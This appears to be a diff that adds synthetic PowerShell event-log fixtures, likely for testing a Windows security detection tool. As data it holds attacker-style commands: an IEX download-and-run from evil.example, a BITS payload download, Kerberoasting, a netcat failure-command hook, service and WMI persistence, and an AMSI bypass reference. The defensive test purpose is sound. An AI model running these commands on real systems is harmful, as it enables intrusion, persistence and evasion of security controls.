@@ -362,6 +362,33 @@ def build() -> list[dict[str, Any]]:
     rows.append(ev(775, BITLOCKER, {**bl, "ProtectorType": "0x8"}, sq + 60_000))
     rows.append(ev(768, BITLOCKER, {**bl, "AlgorithmType": 32772}, sq + 61_000))
     rows.append(ev(4104, PS, {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')", "Path": ""}, ts=t + 140_000))
+    # PowerShell module logging (4103) and pipeline execution details (800), one command each
+    pst = t + 200_000
+    ps_classic = ("PowerShell", "Windows PowerShell")
+    context = "        Host Name = ConsoleHost\r\n        Script Name = \r\n        User = CORP\\alice\r\n"
+    commands = [
+        ("Get-ADGroupMember", [("Identity", "Domain Admins")]),
+        ("New-Object", [("TypeName", "System.IdentityModel.Tokens.KerberosRequestorSecurityToken"), ("ArgumentList", "MSSQLSvc/sql01.corp.local")]),
+        ("Get-ADUser", [("Filter", "ServicePrincipalName -like '*'")]),
+        ("Get-ADTrust", [("Filter", "*")]),
+        (
+            "Set-ItemProperty",
+            [("Path", "HKLM:\\System\\CurrentControlSet\\services\\Spooler"), ("Name", "FailureCommand"), ("Value", "C:\\Users\\Public\\nc.exe")],
+        ),
+        ("New-Service", [("Name", "Updater"), ("BinaryPathName", "C:\\Users\\Public\\svc.exe")]),
+        ("Start-BitsTransfer", [("Source", "http://evil.example/a.exe"), ("Destination", "C:\\Users\\Public\\a.exe")]),
+        ("Set-WmiInstance", [("Namespace", "root/subscription"), ("Class", "__EventFilter")]),
+        ("Add-PrinterPort", [("Name", "C:\\Windows\\System32\\evil.dll")]),
+        ("Invoke-Expression", [("Command", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')")]),
+        ("New-Object", [("TypeName", "System.IO.Pipes.NamedPipeServerStream"), ("ArgumentList", "pipe1")]),
+        ("Add-WindowsCapability", [("Online", "True"), ("Name", "OpenSSH.Server~~~~0.0.1.0")]),
+    ]
+    for i, (name, params) in enumerate(commands):
+        payload = f'CommandInvocation({name}): "{name}"\r\n' + "".join(f'ParameterBinding({name}): name="{k}"; value="{v}"\r\n' for k, v in params)
+        rows.append(ev(4103, PS, {"ContextInfo": context, "UserData": "", "Payload": payload}, pst + i * 1000))
+    typed = "Get-LocalGroupMember -Name Administrators"
+    details = "\tUserId=CORP\\alice\r\n\tHostName=ConsoleHost\r\n\tScriptName=\r\n\tCommandLine=" + typed
+    rows.append(ev(800, ps_classic, {"Data": [typed, details, 'CommandInvocation(Get-LocalGroupMember): "Get-LocalGroupMember"']}, pst + 20_000))
     return rows
 
 
